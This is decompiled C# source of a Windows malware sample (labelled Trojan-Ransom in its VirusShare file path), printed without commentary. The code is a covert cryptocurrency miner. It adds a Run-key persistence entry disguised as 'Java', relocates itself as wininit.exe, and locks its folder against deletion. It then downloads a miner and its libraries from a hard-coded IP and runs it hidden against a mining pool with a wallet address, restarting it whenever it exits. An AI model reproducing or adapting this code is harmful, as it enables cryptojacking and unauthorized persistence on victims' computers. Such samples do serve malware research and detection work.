// Decompiled with JetBrains decompiler
// Type: Form3
// Assembly: wininit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A8A09E0B-2D70-484C-A706-721DFD627EE2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\HEUR-Trojan-Ransom.Win32.Generic-1b063dc5a79686cde5d9b77bdff19ea0f39354d948029b0182d25c94f2bc447c.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;

[StandardModule]
public sealed class Form3
{
  private static WebClient WebClient1 = new WebClient();
  private static Process MiningProcess = new Process();

  [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int GetModuleFileName(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

  [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern int MoveFile([MarshalAs(UnmanagedType.LPTStr), In] string lpExistingFileName, [MarshalAs(UnmanagedType.LPTStr), In] string lpNewFileName, long dwFlags);

  [STAThread]
  public static void Main()
  {
    string name = "goblmah371z";
    Mutex mutex;
    try
    {
      mutex = Mutex.OpenExisting(name);
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      mutex = new Mutex(true, name);
      ProjectData.ClearProjectError();
    }
    try
    {
      if (!Directory.Exists(Interaction.Environ("appdata") + "\\Windows"))
        Form3.LockAndHideFolder(Interaction.Environ("appdata") + "\\Windows");
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue("Java", (object) (Interaction.Environ("appdata") + "\\Windows\\wininit.exe"));
      if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\wininit.exe"))
      {
        string fileName1 = Process.GetCurrentProcess().MainModule.FileName;
        string fileName2 = Process.GetCurrentProcess().MainModule.FileName;
        int moduleFileName = Form3.GetModuleFileName(0, ref fileName2, 256);
        Form3.MoveFile(Strings.LSet(fileName1, moduleFileName), Interaction.Environ("appdata") + "\\Windows\\wininit.exe", 8L);
      }
      string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
      DirectoryInfo directoryInfo = new DirectoryInfo(path);
      if (System.IO.File.Exists(path))
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\jusched.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/CGMiner.exe", Interaction.Environ("appdata") + "\\Windows\\jusched.exe");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\diablo130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/diablo130302.cl", Interaction.Environ("appdata") + "\\Windows\\diablo130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\diakgcn121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/diakgcn121016.cl", Interaction.Environ("appdata") + "\\Windows\\diakgcn121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\libeay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libeay32.dll", Interaction.Environ("appdata") + "\\Windows\\libeay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\libidn-11.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libidn-11.dll", Interaction.Environ("appdata") + "\\Windows\\libidn-11.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\libpdcurses.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libpdcurses.dll", Interaction.Environ("appdata") + "\\Windows\\libpdcurses.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\phatk121016.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/phatk121016.cl", Interaction.Environ("appdata") + "\\Windows\\phatk121016.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\poclbm130302.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/poclbm130302.cl", Interaction.Environ("appdata") + "\\Windows\\poclbm130302.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\libcurl.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/libcurl.dll", Interaction.Environ("appdata") + "\\Windows\\libcurl.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\pthreadGC2.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/pthreadGC2.dll", Interaction.Environ("appdata") + "\\Windows\\pthreadGC2.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\scrypt130511.cl"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/scrypt130511.cl", Interaction.Environ("appdata") + "\\Windows\\scrypt130511.cl");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\ssleay32.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/ssleay32.dll", Interaction.Environ("appdata") + "\\Windows\\ssleay32.dll");
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\zlib1.dll"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sov1001/zlib1.dll", Interaction.Environ("appdata") + "\\Windows\\zlib1.dll");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\Windows\\jusched.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-o http://p2pool.org:9332 -u 14EYvL2thSMEA9hdCB3WZvNhj66xwmmYit -p niceone --auto-fan --auto-gpu --gpu-threads 2 --gpu-fan 20 --temp-target 20 --temp-overheat 30 --no-submit-stale";
      }
      else
      {
        if (!System.IO.File.Exists(Interaction.Environ("appdata") + "\\Windows\\juscheck.exe"))
          Form3.WebClient1.DownloadFile("http://192.40.57.179/sil1001/UFA.exe", Interaction.Environ("appdata") + "\\Windows\\juscheck.exe");
        Thread.Sleep(3009);
        ProcessStartInfo startInfo = Form3.MiningProcess.StartInfo;
        startInfo.FileName = Interaction.Environ("appdata") + "\\Windows\\juscheck.exe";
        startInfo.CreateNoWindow = true;
        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
        startInfo.Arguments = "-a sha256 -g no -o http://p2pool.org:9332 -u 14EYvL2thSMEA9hdCB3WZvNhj66xwmmYit -p niceone -t 2";
      }
      Form3.MiningProcess.Start();
      Form3.MiningProcess.EnableRaisingEvents = true;
      Form3.MiningProcess.Exited += new EventHandler(Form3.MiningProcessClosed);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) Interaction.MsgBox((object) ex);
      ProjectData.ClearProjectError();
    }
    while (true)
      Thread.Sleep(3009);
  }

  public static void MiningProcessClosed(object sender, EventArgs e) => Form3.MiningProcess.Start();

  public static bool LockAndHideFolder(string path)
  {
    string name = WindowsIdentity.GetCurrent().Name;
    FileSystemAccessRule rule1 = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
    FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
    DirectorySecurity directorySecurity = new DirectorySecurity();
    directorySecurity.AddAccessRule(rule1);
    directorySecurity.AddAccessRule(rule3);
    directorySecurity.AddAccessRule(rule2);
    bool flag;
    try
    {
      Process process = new Process();
      Directory.CreateDirectory(path, directorySecurity);
      process.StartInfo = new ProcessStartInfo()
      {
        WindowStyle = ProcessWindowStyle.Hidden,
        FileName = "CMD.exe",
        Arguments = "/C attrib -s -h " + Convert.ToString(path)
      };
      process.Start();
      flag = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      flag = false;
      ProjectData.ClearProjectError();
    }
    return flag;
  }
}
